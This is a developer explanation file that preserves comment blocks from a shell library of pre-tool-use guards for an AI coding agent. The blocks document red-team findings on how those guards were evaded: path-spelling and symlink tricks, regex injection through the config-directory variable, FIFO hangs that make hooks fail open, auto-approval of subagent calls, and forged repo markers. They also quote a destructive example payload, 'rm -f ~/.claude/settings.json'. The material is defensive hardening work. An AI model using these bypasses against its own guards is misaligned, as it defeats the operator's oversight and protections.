---
kind: explanation
owner: @VytCepas
status: unreviewed
---

# Notes moved out of bin/library-admission.sh

On-demand. Comment blocks that told the story of a fix, moved here verbatim when the file's comment ratio was cut (harbor#1392). The code keeps 1-3 lines of why; the history is here and in git.


## bin/library-admission.sh, lines 2-17 (before this edit)

```text
library-admission.sh — shared helpers for the Helm POSIX floor guards (workstream B,
harbor#3). Sourced by bin/guard-*.sh AFTER their kill-switch line. One side
effect at source time: the locale below. Pure POSIX + jq; when jq is absent the field helpers
return empty and guards fail OPEN — the un-swallowable permissions.deny
layer (B1) is the backstop, per docs/how-to/harden-the-host.md's layering.

DELIBERATELY ONE FILE (docs/explanation/modularity.md). Every guard sources this, and
B6 hash-pins each floor file individually — splitting it multiplies the pin
surface, and a sourced helper that lives in five files has five places for a
tamper to hide. Size is the price of one auditable unit.

Provenance: floor_in_repo re-implements the resolution algorithm frozen in
harbor contracts/marker.md (walk up; .agents/ or legacy .claude/config.yaml;
innermost marker wins). Deliberately NOT an import of yard's private
prod_guard._find_config — three parallel implementations, one shared fixture
suite (marker.md:17).
```

## bin/library-admission.sh, lines 19-21 (before this edit)

```text
Bytes, not characters, for every guard. Under gawk in a UTF-8 locale (Linux's default) a 131 KB
payload was never judged within 61 s, while C judged it in 0.09 s: a hook timeout, which fails open
(harbor-core's first hosted CI, Q-R4). Nothing here matches multibyte text, so C changes no verdict.
```

## bin/library-admission.sh, lines 24-28 (before this edit)

```text
THE TWO NAMES THE FLOOR READS FROM THE SCAFFOLDER, and the only two in bin/ (harbor#966, #999). The floor cannot ask the
repo registry: it is hash-pinned POSIX with no I/O it does not control. So they are named once, here, and
contracts/marker.md is the contract that freezes both; tests/scope/siblings holds the count and the agreement.
LEGACY marker file: a marker for the verdict, removed only after fleet reports no repo still on it (#963).
LIFECYCLE plugin id: the repo guard whose wiring lets the floor hand the force-push rules over (floor_repo_wires).
```

## bin/library-admission.sh, lines 34-37 (before this edit)

```text
Trailing slashes are stripped: with them, CFG_RE gained a `//+` that
floor_expand_paths had already collapsed, so no spelling of the config dir
could ever match and every surface rule silently stopped firing
(red-team pass 8).
```

## bin/library-admission.sh, lines 43-68 (before this edit)

```text
floor_port_root — the workspace root the governed repos live under, per
contracts/port-root.md. ONE setting with three readers: Harbor reads it here,
yard's config walk stops before it, fleet defaults PO_FLEET_ROOT
and fleet.yaml's scan root from it (harbor#619). Same shape as the marker
spec next door — one frozen resolution rule, re-implemented per language,
pinned by shared fixtures — and for the same reason: the POSIX floor must not
import a Python resolver across a language boundary.

Resolution, in order: an exported PORT_ROOT, else `$HOME/port`. The default is
per OS; native Windows is refused (contracts/platforms.md) and WSL2 is Linux.

EMPTY IS UNSET. `PORT_ROOT=` in a profile is someone clearing the variable,
never someone naming the root the empty string. The `:-` colon form is what
makes those one answer; the non-colon form would hand the walk below an empty
stop and the guarantee would silently not apply.

HOME UNSET ⇒ NO ROOT, and the caller handles the empty return. M14's rule for
M14's reason: `$HOME/port` with HOME unset spells `/port`, which is a guess
about the machine, and a walk that stops at a guessed path is worse than one
that does not stop — it would un-govern whatever happens to live there.

TRAILING SLASHES STRIPPED, because the stop below is an EQUALITY test against
a physically resolved path. `~/port/` and `~/port` name one directory and
spell it two ways, and a PORT_ROOT that does not exist yet keeps its raw
spelling (nothing to resolve), so the two spellings would otherwise give two
verdicts on the same box — the P13-fs-02 class, one variable over.
```

## bin/library-admission.sh, lines 79-99 (before this edit)

```text
floor_ere_quote <string> — the string with every ERE metacharacter escaped, so
it matches LITERALLY wherever a rule interpolates it.

WHY (docs/explanation/admission-baseline.md P12-configdir-ere-injection-03, critical; reproduced 2026-08-30).
floor_config_dir returns CLAUDE_CONFIG_DIR verbatim and the surface rules
interpolate it straight into CFG_RE / CFGDIR_RE / CFG_TOK. A value carrying an
UNBALANCED metacharacter makes the whole expression invalid, grep exits
non-zero rather than matching, and every rule built on it reads FALSE — the
floor is off while still looking installed, pinned and wired. That is the same
undocumented kill-switch class as an inherited FLOOR_GREP, reached through the
config dir instead of the interpreter.

MEASURED, not reasoned about: with the payload 'rm -f ~/.claude/settings.json',
CLAUDE_CONFIG_DIR='/tmp/x((' and '/tmp/x[' each took the verdict from rc 2 to
rc 0. `)` `*` `+` `|` still blocked — not because they were handled, but
because each happens to leave a VALID (if wrong) expression behind. Blocking
by luck is not blocking, and the luck runs out on the next metacharacter.

Quote only the VARIABLE part of a rule. The hand-written `\.claude` literals
beside it are already correct ERE, and TILDE_USER is a character class that is
MEANT to be one — quoting either would break the rule it is trying to protect.
```

## bin/library-admission.sh, lines 102-154 (before this edit)

```text
floor_host_token — the per-machine partition key for every ledger that shards
by host: the guard-decision ledger (admission-observe.sh), the work-log's session
records (memory-harvest.sh) and its commit subjects (worklog-push.sh).

ONE definition, called by all three. They previously carried the same
`hostname -s` expression as three copies, each with a comment promising the
copies were byte-identical. They were byte-identical, and it did not help:
the VALUE moved underneath all three at once.

2026-08-04, MEASURED on this box. `hostname -s` on macOS reports the
DHCP/DNS-supplied name, not a machine property. With `scutil --get HostName`
unset — which is the macOS default — the name falls back to whatever the
network last supplied, and to the literal `Mac` once nothing has. This machine
flipped from `<owner>s-MacBook-Air` to `Mac` between 19:15 and 19:48 local, and
every host-sharded ledger forked in place: 21917 guard-decision records under
the old key against 54 under the new one, and 67 work-log session files against
38. Nothing errored. A reader of either directory silently under-reports, which
is the failure mode an audit trail exists to not have.

The comment at admission-observe.sh's old call site asserted this value "changes
once per boot". It changes when the network does.

`scutil --get LocalHostName` is the Bonjour name: set in Settings > Sharing,
persisted across reboots and network changes, and already constrained by macOS
to letters, digits and hyphens. When it is absent — unset, or any non-Darwin
box — fall back to the original expression, so the token degrades to the
previous behaviour rather than to `unknown-host`.

Not on the hot path: guards read the cached `.helm-obs-host` token with a
builtin. This is called at SessionStart and by the work-log hooks, where a
fork costs nothing. Sourcing this file still creates nothing (property 3).

BOTH binaries are resolved to an absolute system path, never through PATH, for
the same reason FLOOR_GREP is pinned below: the floor must behave identically no
matter what is early in PATH. A shim named `scutil` or `hostname` on PATH could
otherwise redirect all three ledgers to any valid-looking token and reproduce
the silent under-reporting this function exists to end — and it would look like
a working floor while doing it. Raised on PR #119 review for `scutil`; it applies
equally to `hostname`, because the expression this replaces was PATH-resolved
too, and pinning only the new branch would move the hole one command over
instead of closing it. HOST-1 case 7 is the proof: it shims both and asserts the
token does not move.

NO PATH FALLBACK, deliberately diverging from FLOOR_GREP, which does fall back
to a bare `grep`. For grep, losing the interpreter breaks every rule and the
fallback buys real function. Here the fallback would reopen exactly the hole
above, and the degraded answer — `unknown-host` — is honest and visible: records
still land, in a directory whose name says the machine could not be identified.
A shimmed token is invisible, which is strictly worse than a labelled unknown.

The sanitization is pure parameter expansion rather than `tr`, so the function
spawns nothing that PATH could redirect. Pinning `tr` would have worked too;
not needing it is better, and a host name is short enough that the loop is free.
```

## bin/library-admission.sh, lines 180-181 (before this edit)

```text
floor_read_stdin — capture hook stdin JSON into FLOOR_IN; non-zero when the read itself fails.
harbor#810: /bin/cat first, and a failed read is not an empty payload, which allowed everything.
```

## bin/library-admission.sh, lines 187-188 (before this edit)

```text
floor_field <jq-path> — extract a field from FLOOR_IN; empty on ANY failure
(missing jq, bad JSON, absent field) so callers fail open.
```

## bin/library-admission.sh, lines 194-195 (before this edit)

```text
floor_shell_tool <tool_name> — 0 for a tool that runs tool_input.command in the Bash shell.
Monitor does (pass 14 E-4); a guard that tested `= Bash` let every Monitor command through.
```

## bin/library-admission.sh, lines 198-201 (before this edit)

```text
floor_switch_settings_files [<project dir>] -- the settings files whose `env` block reaches every hook, one per
line. THE ONE PLACE THE SWITCH'S LOCATION IS NAMED (harbor#954 PR B). Where the switch is read from is the open
ADR on harbor#603; this is today's answer, the user tier plus the project's .claude pair, and moving it later is
an edit to this function and to nothing that calls it. The project directory is often $HOME, where
```

## bin/library-admission.sh, lines 212-215 (before this edit)

```text
floor_switch_in_settings <file> -- the switch names (HARBOR_ADMISSION_DISABLE, HARBOR_ADMISSION_SHADOW) that the file's
`env` block sets to 1, one per line. It reads the FILE, with jq, so the decoded key is what is matched: a `\u`
escape, a split edit, a symlinked .claude, a writer after a pipe and a two-step copy all end as the same bytes,
and a check on how it was written cannot see them. Only the literal 1 opens a switch (docs/explanation/admission-baseline.md), so only 1 counts.
```

## bin/library-admission.sh, lines 224-241 (before this edit)

```text
floor_no_human — exit 0 iff this PreToolUse call has NO human able to answer an
interactive `ask` prompt, so an ask-tier verdict would AUTO-APPROVE and must
escalate to `deny`. Measured 2026-08-13: a `bq rm`/`kubectl delete` issued from
a Task/Agent subagent executed with no prompt and no block, while the same call
from the interactive main loop is prompted — an `ask` is toothless off the main
loop, which is exactly where an unattended agent does damage.

FAIL-SAFE TOWARD "HUMAN PRESENT" (return 1 on any doubt). A false "no-human"
would hard-deny an interactive op, the §2.11 disaster that gets the floor
switched off, so only POSITIVE, subagent-SPECIFIC signals flip it — never the
absence of one. Three independent signals, any of which is decisive:
  • permission_mode is an autonomous mode (no prompt is ever shown);
  • transcript_path is under a `/subagents/` dir — MEASURED: every subagent's
    (Task/Agent and workflow) transcript is there, the main loop's never is;
  • agent_type names a subagent/workflow agent (payload carries it, e.g.
    "workflow-subagent"). The transcript signal already covers the case where a
    regular subagent's agent_type is its bare name, so this is belt-and-braces.
Reads FLOOR_IN via floor_field, so floor_read_stdin must have run first.
```

## bin/library-admission.sh, lines 255-288 (before this edit)

```text
floor_in_repo — exit 0 iff cwd is inside a governed repo per
contracts/marker.md (the B5 seam: inside, the floor narrows to global-only
concerns; the veto itself never stands down — docs/reports/platform-epic.md:44).
The marker must be a real, NON-SYMLINK FILE inside a real, non-symlink
`.agents/` — `[ -e .agents ]` accepted a zero-byte file or a
symlink-to-anywhere, letting an attacker-authored tree forge governed status
and switch off the project-policy checks (red-team 2026-07-24, marker-forgery).
Marker PRESENCE decides `repo`; an explicit `context: ambient` in the found
marker's config.yaml decides `ambient` (see below).

M12 (owner decision 2026-07-25): a BARE `.agents/` directory is NOT a marker.
The spec always read "`.agents/` present (the legacy marker file / `config.yaml`)",
and yard's reference `_find_config` has always required a file. Helm
was the permissive one, which is the wrong direction for a guard: a bare
directory made the floor stand down over a repo that had no policy yet — the
exact window a scaffolder opens when it mkdirs `.agents/` before writing into
it. Two implementations now key off the same predicate instead of two.

M14 (owner decision 2026-08-02): the walk STOPS BEFORE $HOME. One file at
`~/.agents/config.yaml` resolves every directory beneath it to `repo` and
stands the ambient layer down machine-wide — and it is a cheap accident, not
an attack: yard run once in the wrong cwd scaffolds `.agents/` right
there. M12 raised the bar from a bare directory to a named FILE and did not
close this, because a scaffolder writes named files. Directories outside
$HOME are untouched and still walk to `/`.

M33-M37 (harbor#619): the walk ALSO stops before PORT_ROOT, the workspace root
the repos live under. Same hazard one level down, and a likelier one: `~/port`
is a directory the operator is told to create, #620 exists to put instruction
files IN it, and a root config carrying `.agents/config.yaml` or
`.claude/config.yaml` would resolve every repo beneath it to `repo` — the
session hooks stand down and the force-push guard defers to a repo guard that
does not exist. Two stops, not one replacing the other: PORT_ROOT defaults
UNDER $HOME, so the M14 stop still has work to do for every path outside it.
```

## bin/library-admission.sh, lines 290-291 (before this edit)

```text
HARBOR_ADMISSION_MARKER_DIR: the directory holding the marker the walk found, even when its value says
`ambient`, so a caller asking about THAT repo's wiring or opt-outs reads the same one (harbor#954).
```

## bin/library-admission.sh, lines 293-295 (before this edit)

```text
Prefer the SESSION cwd the harness sends in the payload (verified present in
a live capture, 2026-07-25) over the hook process's own $PWD, which is only
incidentally the same. The B5 seam's verdict depends on this path.
```

## bin/library-admission.sh, lines 298-305 (before this edit)

```text
Walk the PHYSICAL path. M14's stop is an equality test, and `$HOME/.`,
`$HOME//x/..` and a symlinked route to the same directory all spell it
differently — comparing spellings is how R7 got past the file-tool guard and
how pass 13's P13-fs-02 got past this one. Resolved ONCE here rather than
per level: every ancestor `dirname` yields is then physical too, so one
subshell buys an exact comparison at every level. A cwd that does not exist
cannot be resolved and keeps its raw spelling — M16/M17, where the verdict
is the ambiguity default rather than a path question.
```

## bin/library-admission.sh, lines 311-315 (before this edit)

```text
The same treatment for PORT_ROOT, and it must be the same treatment: a stop
compared as a SPELLING is not a stop (R7, P13-fs-02). A PORT_ROOT that does
not exist yet cannot be resolved and keeps its raw spelling, which is
correct rather than merely tolerable — a directory that is not there is not
an ancestor of any cwd, so the stop is inert until the root exists.
```

## bin/library-admission.sh, lines 321-323 (before this edit)

```text
M14: stop BEFORE examining $HOME itself, so a marker sitting there governs
nothing. Where $HOME is unset the stop does not apply — there is no home
to stop before, and inventing one would be a guess about the machine.
```

## bin/library-admission.sh, lines 325-329 (before this edit)

```text
M33: and stop BEFORE examining PORT_ROOT, so a marker written into the
workspace root governs nothing beneath it either. Unset PORT_ROOT is not
an opt-out: the default `$HOME/port` is what the audit for #619 measured
live on this box, so a stop that only applied to an EXPORTED value would
be off on exactly the machine it was built for.
```

## bin/library-admission.sh, lines 342-354 (before this edit)

```text
`context: ambient` is the owner opting THIS repo back in to the global
layer (yard PI-901 emits `context: repo` and defines `ambient`
as the opt-out). Read at the marker the walk just found, because the
innermost marker wins: an explicit opt-out must DECIDE `ambient`, not
"keep looking", or an outer repo's marker would silently overrule it.

Safe in one direction only, which is why it is honoured unilaterally
ahead of the other two implementations: for a GUARD, `ambient` means
stay fully armed. The dangerous direction — standing the floor down —
is decided by marker PRESENCE and is not reachable through this value,
so reading it adds no forgery surface. The legacy `.claude/config.yaml`
marker is not consulted: it predates the field and no schema defines it
there.
```

## bin/library-admission.sh, lines 356-378 (before this edit)

```text
Anchored at column 0: `context` is a TOP-LEVEL key, and a top-level YAML
key cannot be indented. Allowing leading whitespace would let a
`context: ambient` nested under some unrelated block opt the whole repo
out — the same over-broad-match class the scanner rules keep re-learning.

But quoted keys/values and a space before the colon ARE valid top-level
YAML — `"context": ambient`, `context : ambient`, `context: "ambient"` —
and missing one of them means the floor reads a genuine opt-out as
`repo` and STANDS DOWN. That is the unsafe direction, so the reader is
deliberately the permissive one here. KEEP IN STEP with yard's
_CONTEXT_KEY_RE, which preserves exactly these spellings on upgrade
(PI-901, PR #902 review): a spelling the writer keeps but the reader
misses is an opt-out that survives and is then ignored.

A COMMENT NEEDS WHITESPACE BEFORE IT (yard PR #927 review, ported
here to keep the readers in step). `#` begins a YAML comment only when
preceded by whitespace; otherwise it is part of the plain scalar. So
`context: ambient#typo` is the value `ambient#typo`, NOT `ambient`, and
the old `[[:space:]]*(#.*)?` read it as an opt-out. Safe for a guard —
it errs toward staying armed — and still a divergence, because the
orchestrator parses real YAML and resolves that line differently. Three
readers disagreeing about one line is what the shared fixtures exist to
prevent, so the fixture pins it too.
```

## bin/library-admission.sh, lines 393-398 (before this edit)

```text
floor_repo_wires <hook> <plugin> — exit 0 iff the governing repo WIRES that guard (harbor#954, D-46).
A marker alone is not a guard: a project-policy rule stands down only to one that is present, the
question prod-guard-ambient.sh asks of prod_guard. Read from the RENDERED settings at the repo
floor_in_repo found: a PreToolUse hook whose command names <hook>, or <plugin>@<market> enabled there
(settings.local.json wins) AND listed in this box's installed_plugins.json. A symlinked .claude or
settings file is refused, as a symlinked marker is. No jq or bad JSON ⇒ not wired: stay armed.
```

## bin/library-admission.sh, lines 424-465 (before this edit)

```text
floor_collapse_dots <text> — collapse `//`, `/./` and `/x/../` to a fixpoint.

ONE collapse, every caller. There were three partial ones and they disagreed:
floor_norm_path (the file-tool guard's) collapsed `/x/../`, floor_expand_paths
(every Bash-surface path rule's) collapsed only `//`, and floor_bash_targets
had a third spelling doing `//` and `/./`. So
`~/Library/../.claude/bin/admission-bash.sh` was a protected control surface to
guard-selfedit and an ordinary path to guard-bash — same inode, two answers,
measured at exit 0 with the floor live (pass 13, P13-fs-02). Two guards that
disagree about which file a path names is not a missing rule, it is a missing
definition.

DELIBERATELY LEXICAL, NEVER SYMLINK-AWARE, and that is a decision, not a
shortcut:
  • There is nothing to resolve. floor_expand_paths canonicalises whole COMMAND
    TEXT, not a path — the tokens are not split, and the target of a `>` does
    not exist until the command the guard is about to veto creates it.
  • It fails toward BLOCKING. Every caller ADDS the collapsed spelling
    alongside the raw one and greps both, so a collapse that is wrong about a
    symlinked component can only put an extra string in front of the rules; it
    can never delete the raw spelling, so it cannot manufacture a miss.
  • Resolving would cost a fork per token inside a PreToolUse hook, where a
    timeout is a SKIPPED hook and latency is therefore itself a fail-open
    bypass — the same reasoning FLOOR_MAX_NORM records.
  • A symlink resolved BEFORE the command runs can be replaced before it runs.
floor_norm_path still resolves physically when it can; this is only the
fallback for when the parent does not exist.

THE COMPONENT BEING CANCELLED MUST NOT ITSELF BE `..`. An earlier regex
cancelled `..` against `..`, so `/h/d1/d2/d3/d4/../../../../.claude/x` landed
on `/h/d1/d2/.claude/x`, short of the config dir on exactly the deep spelling an
evader reaches for. A bounded pass count was the next bug (PR #113): hitting
the cap returned a path still holding `/../`, and depth 17 reached the live
settings file at rc=0. A cap that fails OPEN is worse than no cap.

ONE LEFT-TO-RIGHT PASS OVER A STACK (harbor#759). The regex fixpoint it
replaces needed a pass per nesting level, O(depth x length): collapsing every
target line with it took a 32KB payload from 4.3s to 29.6s, a hook-timeout
fail-open, so `bash -c` bodies went uncollapsed. Same result on every string
(differentially fuzzed against it), plus one rule it lacked: `/..` is `/`, so
a `..` at the start of a word is dropped rather than cancelling the word
before it. A `..` with nothing under it to cancel (`~/..`, `../x`) is kept.
```

## bin/library-admission.sh, lines 548-553 (before this edit)

```text
floor_norm_path <path> — normalize a filesystem path so the classifier
reasons about the RESOLVED target, not its spelling. Expands ~, makes it
absolute, resolves the parent physically (symlinks included) via `cd -P`,
and lexically collapses ./ // and ../ when the parent does not exist.
Red-team 2026-07-24: ./ , // and bin/../ all reached the real settings.json
(same inode) while string-matching the protected globs said "not protected".
```

## bin/library-admission.sh, lines 557-560 (before this edit)

```text
Follow a symlink AT THE LAST COMPONENT too: resolving only the parent left
`ln -s <protected> notes.json` (and hardlinks) pointing straight at the real
inode while the classifier saw an innocent name (red-team pass 2). Bounded
loop so a symlink cycle cannot hang the hook.
```

## bin/library-admission.sh, lines 573-576 (before this edit)

```text
Lexical fallback: the parent does not exist, so there is no inode to resolve
and the shared collapse is all that is left. SHARED, not copied — this is the
definition guard-bash reads too, so the two guards cannot drift apart again
on what `~/x/../.claude` names (harbor#94, P13-fs-02).
```

## bin/library-admission.sh, lines 591-676 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
OBSERVE-1 (harbor#41) — the guard-decision record.

  floor_log_decision <guard> <verdict> <rule.shape>

Five properties, in strict precedence order. Every clause below is one of them.

1. A LOGGING FAILURE NEVER CHANGES A VERDICT. Four of the six hook scripts run
   `set -eu` (guard-bash:20, guard-egress:11, guard-selfedit:17,
   annotate-web:11) and admission-hook.sh:64-67 maps EVERY rc outside {0,2} to a
   DENY. So one unwrapped failing redirect turns a read-only disk into "every
   tool call in this session is blocked" — telemetry becoming an outage.
   Every statement here is neutralised and the last command is `return 0`.

2. THE DIRECTORY MUST BE UNWRITABLE. `>>` blocks forever in open(2) on a FIFO
   with no reader; admission-hook.sh:53 captures the guard's stdout in `$( )` and
   waits for EOF; `timeout`/`gtimeout` are BOTH ABSENT on macOS (verified on
   this box); and a PreToolUse hook that exceeds its timeout is SKIPPED. A hang
   here is therefore a total bypass of all 70 rules, reached with no latency at
   all. `[ -f ] && [ ! -L ]` bounds only a STATIC plant, not the race — the
   design pass measured a type-check-only writer hang 17 times in 1200 calls
   against a spinner that unlinks-and-mkfifos the sink. Planting a FIFO needs
   WRITE on the directory, so holding it at 0500 (admission-observe.sh) closes it:
   the attacker must fit chmod+unlink+mkfifo between our stat and our open.
   CAVEAT, deliberately recorded: access(2) short-circuits for uid 0, so this
   gate does NOT hold for a session running as root. The floor is not designed
   to be run as root and B1 is the backstop there.
   If the mode drifts we go BLIND, never slow — records drop, verdict untouched.

3. IT CREATES NOTHING. No mkdir, no `>`, no rotation, no size check. A hot path
   that creates files is a hot path that can be aimed; and `[ -d ] || mkdir -p`
   FORKS on every call once the dir is uncreatable, making the broken case an
   order of magnitude slower than the healthy one. It is also what makes
   floor-test.sh structurally unable to reach the operator's live tree: the
   suite sets CLAUDE_CONFIG_DIR but never $HOME, and a writer that cannot
   create cannot pollute what it cannot find. That is not hypothetical — a
   design-phase prototype whose writer COULD mkdir wrote 1002 records into the
   live ~/.claude/MEMORY tree during this ticket's own design.

4. NO PAYLOAD-DERIVED BYTES REACH THE BUILDER. Every field is a call-site
   literal, a closed enum mapped through a `case` with NO pass-through arm,
   fixed-width hex, or a clock reading. There is no escaping path because there
   is nothing escapable — POSIX sh has no JSON.stringify, and a redaction that
   depends on escaping is one edit away from being wrong. Note what is absent:
   the floor_block MESSAGE. admission-egress.sh:420 interpolates a redirect target
   lifted out of the command, and admission-self-edit.sh:73 interpolates the
   payload's resolved file_path (CONSTITUTION №3).

5. ONE RECORD = ONE printf = ONE write(). Two guards append to one file for a
   single Bash call (admission-install.sh:88-89) and tool calls run in parallel, so
   interleaving is the normal case, not the edge case. Measured on this box:
   concurrent `printf >> file` under /bin/sh is atomic up to EXACTLY 1024 bytes
   including the newline and tears reliably above it (8 writers x 300 records:
   0 torn at 1023, 1278 torn at 1024). That bound is stdio's buffer, NOT
   PIPE_BUF — PIPE_BUF governs pipes, not regular files, and quoting it here
   would be a plausible wrong reason for a right number. Records measure
   ~110 bytes; the cap is asserted at 512 to keep half the real margin spare.

NOT SETTABLE FROM THE ENVIRONMENT, deliberately: an overridable sink path or a
HARBOR_ADMISSION_OBSERVE_DISABLE switch would be an undocumented SECOND kill switch for the
block ledger, settable from a project settings.json `env` block — the exact
class already refused for FLOOR_GREP, FLOOR_AWK and FLOOR_INSTR_SURFACES.

EVERY GUARD THAT LOGS MUST BE NAMED HERE, and the enum is why: an unlisted token
is coerced to `other`, silently. guard-cloud and guard-destroy shipped
(harbor#201/#194) without this line being extended, so 745 of their decisions
filed as g=other — invisible to the tool census, whose whole purpose is to catch
a dead dispatch arm by a class that never appears. A guard added to the floor
without a token added here is a guard the ledger cannot see.

IT THEN HAPPENED AGAIN, TO THE GUARD THAT SHIPPED NEXT, and the second time is
what makes this a mechanism problem rather than an oversight. `deliverables` was
passed by admission-deliverables.sh from the day it landed and was never added here,
so its entire output filed as `other`. Measured on this box 2026-09-05: all
1,805 `other` records are that one guard -- 1,780 deliverables-clean, 20
home-loose, 5 dropzone -- and NOT ONE was written by an unrecognised guard. The
bucket whose whole job is to make an unknown writer visible was 100% a known
one, so the census could not have caught the thing it exists to catch.

So the paragraph above was true, was written down, and still did not hold,
because a rule with no mechanism is a wish. LINT C7 IS THE MECHANISM: it reads
this line against every literal `floor_log_decision <token>` call site in bin/
and hooks/ and fails when the two disagree in EITHER direction -- an unlisted
writer (this defect) and a listed token nobody writes (the dead dispatch arm the
census is for). Extending this line is now a change the linter demands, not one
the next author has to remember.
```

## bin/library-admission.sh, lines 678-683 (before this edit)

```text
`ask` is a REAL verdict, not a near-miss. It was missing here for the same reason
the guard tokens were: the enum predates the two ASK-gate guards. 548 ask records
had already been coerced to `other` when this was found — and the ask tier is
exactly the one that auto-approves in an unattended session (admission-cloud.sh:104),
so "how often was the soft tier hit" was the one question the ledger most needed
to answer and structurally could not.
```

## bin/library-admission.sh, lines 730-733 (before this edit)

```text
Charset gate BEFORE enum membership, always. The membership test expands the
candidate inside double quotes so its metacharacters are already literal,
but the gate keeps that true independently of one pair of quotes surviving a
future edit.
```

## bin/library-admission.sh, lines 744-747 (before this edit)

```text
<rule>.<shape> split by parameter expansion — two builtins, no forks. The
DOTTED form (not a `flat-`/`argv-` prefix) keeps the rule token shared across
a flat/argv twin, so "top rules" groups them as one rule while the DE-01 axis
stays queryable on `s`.
```

## bin/library-admission.sh, lines 755-756 (before this edit)

```text
tool_name is ATTACKER-SHAPED for the mcp__* family (a repo-supplied .mcp.json
names them), so it is MAPPED to a constant, never passed through.
```

## bin/library-admission.sh, lines 764-796 (before this edit)

```text
THE SINK FOLLOWS THE WRITER, NOT THE CALLER. This read
`${CLAUDE_CONFIG_DIR:-$HOME/.claude}` — the CALLER's environment — and that is
how a guard executed out of a repo checkout filed its fixtures next to the
operator's real decisions. Measured 2026-08-25 on this box: 1,723 cloud/destroy
records in one day written by suite copies, and every crit-eligible
`wrapper-no-jq` record traced to ONE line in an unmerged branch's
destroy-guard-test.sh, which fires `env -i PATH=... HOME="$HOME"`.

THAT `env -i` IS WHY PER-SUITE ISOLATION CANNOT BE THE FIX. It strips
CLAUDE_CONFIG_DIR by construction and re-passes HOME deliberately, so the
sink resolved to the live tree no matter what the suite set. A convention
cannot survive a caller whose whole purpose is a clean environment — and the
same fix by convention was already tried and lost: lint F4 hand-lists four
suites, and the two that escaped were not among them.

`$0` IS THE GUARD, NOT THIS FILE. library-admission.sh is SOURCED (`. "$DIR/library-admission.sh"`
in every guard), and POSIX sh does not rebind $0 inside a function, so $0 is the
sourcing script: <cfg>/bin/<guard>.sh for all 22 wired hook commands, every one
of them an absolute path (verified against the live hook table). Two strips give
the config root — byte-identical to the old answer in production, and a checkout
with no MEMORY/OBSERVABILITY tree everywhere else. The writer CREATES NOTHING
(property 3), so "everywhere else" means blind rather than misfiled.

floor_config_dir() IS DELIBERATELY UNTOUCHED, and the distinction is the whole
design: a guard must keep resolving surface rules against the config dir the
SESSION uses — it protects the directory it is governing, not the directory it
was copied from. Only the sink follows the writer.

The trailing-slash strip is kept from the previous spelling: without it CFG_RE
gained a `//+` and every surface rule silently stopped firing (red-team pass 8).
A relative spelling is still refused outright — `sh admission-bash.sh` from inside
bin/ leaves no slash to strip, so the case below drops the record. Blind, never
wrong.
```

## bin/library-admission.sh, lines 801-805 (before this edit)

```text
Host token via the `read` BUILTIN — zero forks, for a value that changes once
per boot. TYPE-CHECKED FIRST: `read` from a FIFO blocks exactly like `>>`
does, so the token file gets the same treatment as the sink. Absent or
hostile => a partition that does not exist => the gate below refuses =>
blind, never wrong.
```

## bin/library-admission.sh, lines 814-815 (before this edit)

```text
THE TWO GATES. Order matters: the directory gate is what keeps the file
gate's answer true one instruction later. See property 2 above.
```

## bin/library-admission.sh, lines 821-825 (before this edit)

```text
The clock's fork (the session key below adds one hash, ~2 ms; harbor#309). There is no POSIX builtin clock: EPOCHSECONDS and
EPOCHREALTIME are unset under /bin/sh (bash 3.2.57), $SECONDS reads 0 in a
fresh hook process, and /usr/bin/awk has no systime(). A malformed clock
ABORTS the record rather than writing an unparseable field — one dropped
record beats a ledger that jq refuses.
```

## bin/library-admission.sh, lines 832-853 (before this edit)

```text
DECISION PATHS ONLY — block, deny, ask. Never allow.

The original rule was `block` alone, and its reasoning still holds for the
allow path verbatim: on an allow there is no consumer, the rules are
deterministic on the command so a command that allows once allows always, and
it would put a fork plus a command oracle on the overwhelming majority of the
file. That majority is real — allow is 12,863 of 21,303 records measured.

BUT `block` ALONE MADE THE FIELD UNREACHABLE FOR TWO WHOLE GUARDS.
guard-cloud and guard-destroy never emit `block` — their entire output is
permissionDecision verdicts — so `h` was "-" on 7,873 of 7,873 of their
records, and "which command triggered this deny" was unanswerable for the
tier that gates dataset deletion and device wipes (harbor#350).

The cost objection does not transfer to this tier, and that is measured
rather than assumed: deny+ask is 8,450 records, of which 8,429 are
cloud+destroy and ~97% of those are burst-shaped test fixtures that
harbor#343 stops at the source. Excluding them, deny+ask across the whole
ledger's life is 21 records. A fork on that is not a fork on the hot path.

`advise` and `armed` are deliberately NOT here: neither gates anything, so
neither has the consumer that justifies the fork.
```

## bin/library-admission.sh, lines 863-868 (before this edit)

```text
THE SESSION KEY, `sk` (harbor#309): which session wrote the record, so a block can be joined to
what that session did next. Salted like `h` under a `sid:` prefix, never the raw id. Read by
expansion, not jq: no fork for the read, one hash (on allow records too, which carry no `h`).
ANCHORED to the payload's first key, as the harness sends it (fixtures/pretooluse-bash-real.json):
a reordered payload gives `-` rather than an MCP tool's `session_id` argument, and nothing past
the prefix is scanned. Any doubt gives `-`; the verdict never depends on it.
```

## bin/library-admission.sh, lines 884-887 (before this edit)

```text
THE CONFINEMENT FIELD, `c` (harbor#1298, #555): a closed enum, never a payload byte. `off` while no confinement is
installed (no marker beside managed settings: deploy-confinement.sh writes it), `unconfined` when the call asked for
the unsandboxed retry, `confined` otherwise, `-` for a tool the confinement does not wrap. `-f` and a case match
only: no fork on the hot path. Read by admission-observe-report.sh --confinement for #555 decision 10 (a), the escape rate.
```

## bin/library-admission.sh, lines 899-901 (before this edit)

```text
THE ESCAPE CLASS, `x` (harbor#1441): which kind of call asked to leave the sandbox, from the first verb of the command
and printed as a literal from HARBOR_ADMISSION_CLASSES, never a payload byte. Only the bash guard's record of an unconfined
call carries one; `-` everywhere else. Read by admission-observe-report.sh --confinement.
```

## bin/library-admission.sh, lines 913-939 (before this edit)

```text
floor_obs_digest <cfg-dir> — 16 hex of sha256(salt ":" subject[0:512]), or "-".

THE SUBJECT IS $FLOOR_OBS_SUBJECT, set by each guard right after it extracts
its payload — NOT a fourth argument to floor_block. Passing payload text into
floor_block would leave it one careless edit away from the stderr printf. Not
$FLOOR_IN either: the raw payload carries session_id and cwd, so the same
command would hash differently in two sessions and recurrence counting — the
only thing the digest is for — would be dead on arrival.

SALTED, not merely truncated. An unsalted truncated sha256 of a low-entropy
shell command is a CONFIRMATION ORACLE, not a redaction: floor_block's stderr
TELLS the operator which commands were blocked, so known plaintext is
guaranteed, and at 48 bits a match against a candidate is effectively proof.
Shortening it to blunt that destroys the recurrence counting it exists for.
There is no truncation length that is both safe and useful; a per-install
secret is the only operating point that answers "is this the same command
again?" without answering "what was the command?".

